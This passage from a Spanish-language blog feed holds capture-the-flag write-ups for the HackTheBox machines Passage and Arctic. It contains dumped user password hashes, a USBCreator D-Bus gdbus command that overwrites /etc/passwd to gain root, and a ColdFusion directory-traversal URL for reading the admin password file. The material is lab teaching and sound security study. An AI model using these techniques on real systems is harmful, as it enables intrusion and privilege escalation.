:4:&quot;name&quot;;s:9:&quot;sid-meier&quot;;s:3:&quot;acl&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:15:&quot;sid@example.com&quot;;s:4:&quot;nick&quot;;s:9:&quot;Sid Meier&quot;;s:4:&quot;pass&quot;;s:64:&quot;4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592485645&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483047;s:5:&quot;admin&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:15:&quot;sid@example.com&quot;;s:9:&quot;sid-meier&quot;;}}a:1:{s:4:&quot;name&quot;;a:1:{s:10:&quot;paul-coles&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483236&quot;;s:4:&quot;name&quot;;s:10:&quot;paul-coles&quot;;s:3:&quot;acl&quot;;s:1:&quot;2&quot;;s:5:&quot;email&quot;;s:16:&quot;paul@passage.htb&quot;;s:4:&quot;nick&quot;;s:10:&quot;Paul Coles&quot;;s:4:&quot;pass&quot;;s:64:&quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592485556&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}a:1:{s:4:&quot;name&quot;;a:1:{s:9:&quot;kim-swift&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483309&quot;;s:4:&quot;name&quot;;s:9:&quot;kim-swift&quot;;s:3:&quot;acl&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:15:&quot;kim@example.com&quot;;s:4:&quot;nick&quot;;s:9:&quot;Kim Swift&quot;;s:4:&quot;pass&quot;;s:64:&quot;f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592487096&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;3&quot;;}}}a:1:{s:4:&quot;name&quot;;a:1:{s:6:&quot;egre55&quot;;a:11:{s:2:&quot;id&quot;;s:10:&quot;1598829833&quot;;s:4:&quot;name&quot;;s:6:&quot;egre55&quot;;s:3:&quot;acl&quot;;s:1:&quot;4&quot;;s:5:&quot;email&quot;;s:15:&quot;egre55@test.com&quot;;s:4:&quot;nick&quot;;s:6:&quot;egre55&quot;;s:4:&quot;pass&quot;;s:64:&quot;4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc&quot;;s:4:&quot;more&quot;;s:60:&quot;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&quot;;s:3:&quot;lts&quot;;s:10:&quot;1598834079&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:6:&quot;avatar&quot;;s:26:&quot;avatar_egre55_spwvgujw.php&quot;;s:6:&quot;e-hide&quot;;s:0:&quot;&quot;;}}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483309;s:9:&quot;kim-swift&quot;;}}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De los hashes obtenidos procederemos a crackearlos en nuestra web de confianza.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://crackstation.net/&quot;&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Logramos obtener unas contraseñas en texto claro.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora intentaremos logearnos con algunos de los usuarios del sistema, haciendo uso de las contraseñas que obtuvimos y conseguimos logearnos como el usuario &lt;code&gt;paul&lt;/code&gt;. Podemos ir a su directorio de trabajo y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul
Password: 
paul@passage:/var/www/html/CuteNews/cdata/users$ cd /home/paul/
paul@passage:~$ cat user.txt 
9914c80b41f867472dd68c1e54c77609
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Enumerando al usuario &lt;code&gt;paul&lt;/code&gt;, encontramos que tenemos un directorio oculto &lt;code&gt;.ssh&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;paul@passage:~$ ls -la
total 112
drwxr-x--- 16 paul paul 4096 Sep  2  2020 .
drwxr-xr-x  4 root root 4096 Jul 21  2020 ..
----------  1 paul paul    0 Jul 21  2020 .bash_history
-rw-r--r--  1 paul paul  220 Aug 31  2015 .bash_logout
-rw-r--r--  1 paul paul 3770 Jul 21  2020 .bashrc
drwx------ 10 paul paul 4096 Sep  1  2020 .cache
drwx------ 14 paul paul 4096 Aug 24  2020 .config
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Desktop
-rw-r--r--  1 paul paul   25 Aug 24  2020 .dmrc
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Documents
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Downloads
-rw-r--r--  1 paul paul 8980 Apr 20  2016 examples.desktop
drwx------  2 paul paul 4096 Aug 24  2020 .gconf
drwx------  3 paul paul 4096 Sep  2  2020 .gnupg
-rw-------  1 paul paul 1292 Sep  2  2020 .ICEauthority
drwx------  3 paul paul 4096 Aug 24  2020 .local
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Music
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Pictures
-rw-r--r--  1 paul paul  655 May 16  2017 .profile
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Public
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 .ssh
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Templates
-r--------  1 paul paul   33 Apr 17 09:08 user.txt
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Videos
-rw-------  1 paul paul   52 Sep  2  2020 .Xauthority
-rw-------  1 paul paul 1228 Sep  2  2020 .xsession-errors
-rw-------  1 paul paul 1397 Sep  1  2020 .xsession-errors.old
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dentro del directorio podemos visualizar una clave &lt;code&gt;authorized_keys&lt;/code&gt;, que pertenece al usuario &lt;code&gt;nadav&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;paul@passage:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub  known_hosts
paul@passage:~/.ssh$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Por principios basicos de claves &lt;code&gt;ssh&lt;/code&gt; al tener la clave publica del usuario &lt;code&gt;nadav&lt;/code&gt;, puedo conectarme como a la propia maquina sin proporcionar contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;paul@passage:~/.ssh$ ssh nadav@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:oRyj2rNWOCrVh9SCgFGamjppmxqJUlGgvI4JSVG75xg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$ whoami
nadav
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora que somos el usuario &lt;code&gt;nadav&lt;/code&gt;, listamos los recursos de su directorio personal y tratando de leer los archivos ocultos, vemos el contenido del archivo &lt;code&gt;viminfo&lt;/code&gt;, el cual hace bastante mención a un archivo &lt;code&gt;USBCreator&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:~$ cat .viminfo 
# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&amp;amp;AdminIdentities=unix-group:root

# Last Substitute String:
$AdminIdentities=unix-group:sudo

# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g

# Search String History (newest to oldest):
? AdminIdentities=unix-group:root

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:

# File marks:
'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

&amp;gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
	&quot;	12	7

&amp;gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
	&quot;	2	0
	.	2	0
	+	2	0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como hace mucha referencia a el archivo &lt;code&gt;USBCreator&lt;/code&gt;, vamos a proceder a buscar si exiten vulnerabilidades asociadas y concretamente entramos una relacionada a &lt;code&gt;Privilege Escalataion&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Aqui el articulo para mayor detalle:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/&quot;&gt;https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;En resumen la vulnerabilidad aprovecha una cierta capacidad de sobrescritura de los permisos de un archivo usando el comando &lt;code&gt;gdbus&lt;/code&gt;, cambiandolos por los del usuario privilegiado &lt;code&gt;root&lt;/code&gt;.
Podemos aprovecharnos de esta vulnerabilidad de muchas maneras. Concretamente en este caso primero realizaremos una copia del &lt;code&gt;/etc/passwd&lt;/code&gt; de la maquina y lo modificaremos agregando una contraseña que vamos a computar con &lt;code&gt;openssl&lt;/code&gt; al usuario &lt;code&gt;root&lt;/code&gt;. Y una vez tengamos el archivo modificado aprovecharemos de esta vulnerabilidad para sobrescribir el archivo original del &lt;code&gt;/etc/passwd&lt;/code&gt; con el nuevo que tenemos, de modo que al haberle cambiado la contraseña a &lt;code&gt;root&lt;/code&gt; podamos convertirnos en el con la contraeñas que le indicamos.&lt;/p&gt;

&lt;p&gt;Vamos a hacerlo paso a paso para que se entienda:&lt;/p&gt;

&lt;p&gt;Primero nos copias el &lt;code&gt;/etc/passwd&lt;/code&gt; para evitar problemas de permisos lo haremos en la ruta &lt;code&gt;tmp&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ cp /etc/passwd .
nadav@passage:/tmp$ ls
config-err-QHQCht                                                       systemd-private-70af303641bf4fb2935fb9f554b4ff23-fwupd.service-rSKHgW              unity_support_test.0
passwd                                                                  systemd-private-70af303641bf4fb2935fb9f554b4ff23-rtkit-daemon.service-1jCj09       VMwareDnD
systemd-private-70af303641bf4fb2935fb9f554b4ff23-colord.service-h1Z4SP  systemd-private-70af303641bf4fb2935fb9f554b4ff23-systemd-timesyncd.service-zchybP  vmware-root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez tenemos el &lt;code&gt;passwd&lt;/code&gt;, vamos a crearnos una contraseña, la cual tiene que estar en formato &lt;code&gt;desk unix&lt;/code&gt;. Eso lo hacemos con &lt;code&gt;openssl passwd&lt;/code&gt;, el cual nos pedira una contraseña. En este caso le pondre algo simple como la palabra &lt;code&gt;hola&lt;/code&gt;, pero se puede poner cualquier cosa.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ openssl passwd
Password: 
Verifying - Password: 
POoz1bD1QhbD.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seguidamente debemos modifcar el &lt;code&gt;passwd&lt;/code&gt; y en &lt;code&gt;root&lt;/code&gt;. Para esto reeemplazamos la &lt;code&gt;x&lt;/code&gt; por nuestra contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ cat passwd 
root:POoz1bD1QhbD.:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nolog
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues tal y como nos dice la vulnerabilidad, usamos el comando &lt;code&gt;gdbuss&lt;/code&gt; tal cual los parametros mencionados y le indicamos primero nuestro archivo &lt;code&gt;/tmp/passwd&lt;/code&gt;y seguido la ruta original donde lo sobreescribiremos &lt;code&gt;/etc/passwd&lt;/code&gt; finalmente el parametro &lt;code&gt;true&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/passwd /etc/passwd true
()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora proceremos a leer el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ cat /etc/passwd
root:POoz1bD1QhbD.:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que efectivamente lo modificamos la contraseña del usuario &lt;code&gt;root&lt;/code&gt;. Lo que nos queda ahora es migrar al usuario &lt;code&gt;root&lt;/code&gt;, dirigirnos a su directorio personal y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ su root
Password: 
root@passage:/tmp# cd /root
root@passage:~# cat root.txt
36b5bcee8e0d7f4be426e8016250dd7f
root@passage:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esto seria todo por esta ocasión 😄&lt;/p&gt;
</description>
        <pubDate>Mon, 17 Apr 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Passage</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Passage</guid>
        
        <category>CuteNews Explotation</category>
        
        <category>Code Analysis</category>
        
        <category>USBCreator D-Bus</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Arctic - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina &lt;code&gt;Arctic&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Windows&lt;/code&gt; de dificultad &lt;code&gt;Facil&lt;/code&gt;. Para explotar esta maquina abusaremos una vulnerabilidad de &lt;code&gt;Adobe Coldfusion 8&lt;/code&gt; que nos permitira realizar un &lt;code&gt;directory path traversal&lt;/code&gt; y una vez conectados al &lt;code&gt;Coldfusion&lt;/code&gt; nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo &lt;code&gt;jsp&lt;/code&gt; malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario &lt;code&gt;administrator&lt;/code&gt; nos aprovecharemos del privilegio &lt;code&gt;Seimpersonateprivilege&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Arctic
❯ ls
 Arctic
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.11
PING 10.10.10.11 (10.10.10.11) 56(84) bytes of data.
64 bytes from 10.10.10.11: icmp_seq=1 ttl=127 time=168 ms

--- 10.10.10.11 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 167.800/167.800/167.800/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde con un &lt;code&gt;ttl&lt;/code&gt; de &lt;code&gt;127&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemos a el scaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.11 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-11 15:49 GMT
Initiating SYN Stealth Scan at 15:49
Scanning 10.10.10.11 [65535 ports]
Discovered open port 135/tcp on 10.10.10.11
Discovered open port 49154/tcp on 10.10.10.11
Discovered open port 8500/tcp on 10.10.10.11
Completed SYN Stealth Scan at 15:49, 26.54s elapsed (65535 total ports)
Nmap scan report for 10.10.10.11
Host is up, received user-set (0.13s latency).
Scanned at 2023-04-11 15:49:10 GMT for 27s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
135/tcp   open  msrpc   syn-ack ttl 127
8500/tcp  open  fmtp    syn-ack ttl 127
49154/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 19 (836B)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver puertos interesantes que se encuentran abiertos como &lt;code&gt;135 rpc&lt;/code&gt; , &lt;code&gt;8500 fmtp&lt;/code&gt; , &lt;code&gt;445 smb&lt;/code&gt; y &lt;code&gt;49154 unknown - desconocido&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p 135,8500,49154 10.10.10.11 -oN targets
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-11 15:51 GMT
Nmap scan report for 10.10.10.11
Host is up (0.29s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.62 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos la versión de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8500&lt;/td&gt;
      &lt;td&gt;FMTP?&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;49154&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Primero ya que &lt;code&gt;nmap&lt;/code&gt; no detecto el servicio del puerto &lt;code&gt;8500&lt;/code&gt; en vista que nos pregunta si es &lt;code&gt;fmtp?&lt;/code&gt;, puede tratarse de un servicio web, pero como tarda en responder al no encontrar nada no tiene claro el servicio.&lt;/p&gt;

&lt;p&gt;Vamos al navegador y veamos si el servicio es &lt;code&gt;http&lt;/code&gt;, nos tarda un poco pero efectivamente si es un servicio web.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dentro del dicrectorio &lt;code&gt;CFIDE&lt;/code&gt; vemos nuevos directorios interesantes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora vamos al direcotrio &lt;code&gt;administrator&lt;/code&gt;, vemos un panel administrativo de &lt;code&gt;Adobe Coldfusion 8&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seguidamente veamos con &lt;code&gt;searchsploit&lt;/code&gt; si existen vulnerabilidades asociadas a &lt;code&gt;Adobe coldfusion&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit adobe coldfusion
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                                  | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                                                               | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                                  | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                                                                   | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                                          | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                                        | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                                                                    | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                                   | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                                                                  | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                                                                            | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                                                               | multiple/remote/30210.rb
Adobe ColdFusion &amp;lt; 11 Update 10 - XML External Entity Injection                                                                                      | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                                                            | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                                         | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                                      | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                                               | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                                                | cfm/webapps/33168.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que hay varias vulnerabilidades asociadas como una concreta &lt;code&gt;Adobe ColdFusion 8 - Remote Command Execution (RCE)&lt;/code&gt;, que concretamente nos va a automatizar todo un proceso para ganar acceso a la maquina. Pero en este caso ya que vamos a realizar la explotación manualmente usaremos la asociada con &lt;code&gt;Adobe ColdFusion - Directory Traversal&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Pasemos a inspeccionar ese exploit y veamos en que consiste.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit -x multiple/remote/14641.py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Veamos de que trata el exploit&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Working GET request courtesy of carnal0wnage:
# http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
#
# LLsecurity added another admin page filename: &quot;/CFIDE/administrator/enter.cfm&quot;


#!/usr/bin/python

